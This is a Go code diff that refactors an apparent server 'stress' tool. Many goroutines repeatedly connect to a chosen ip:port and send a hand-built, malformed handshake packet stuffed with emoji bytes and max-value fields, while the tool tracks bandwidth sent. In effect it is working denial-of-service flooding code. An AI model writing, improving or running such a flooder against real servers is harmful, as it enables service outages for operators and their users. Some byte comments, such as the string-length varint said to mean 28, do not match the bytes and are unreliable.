@@ -14,7 +14,7 @@ import (
 var totalDataSent int64 = 0
 var debug = false // Set this to true if you want to see error messages
 
-func stressServer(address string, wg *sync.WaitGroup, packet []byte) {
+func stressServer(address string, wg *sync.WaitGroup) {
 	defer wg.Done()
 
 	for {
@@ -24,6 +24,17 @@ func stressServer(address string, wg *sync.WaitGroup, packet []byte) {
 				log.Println("Error connecting:", err)
 			}
 			continue // Continue to the next iteration to retry connecting
+		}
+
+		// Create the packet
+		packet := []byte{
+			0x03,
+			0x64, // Pack varint for 100
+			0x53, 0x44, 0xF0, // Pack string length as varint for 28
+			0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A,
+			0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, // UTF-8 encoded rocket emojis
+			0xFF, 0xFF, // Max unsigned short value (65535)
+			0x01,
 		}
 
 		// Send the packet
@@ -82,21 +93,10 @@ func main() {
 
 	address := ip + ":" + port
 
-	packet := []byte{
-		0x03,
-		0x64, // Pack varint for 100
-		0x53, 0x44, 0xF0, // Pack string length as varint for 28
-		0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A,
-		0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, 0xF0, 0x9F, 0x9A, 0x80, // UTF-8 encoded rocket emojis
-		0xFF, 0xFF, // Max unsigned short value (65535)
-		0x01,
-	}
-
-	data := make([]byte, 1024*1024) // 1MB
 	var wg sync.WaitGroup
 	for i := 0; i < threads; i++ {
 		wg.Add(1)
-		go stressServer(address, &wg, packet) // Start a new goroutine
+		go stressServer(address, &wg) // Start a new goroutine
 	}
 
 	go printBandwidth()
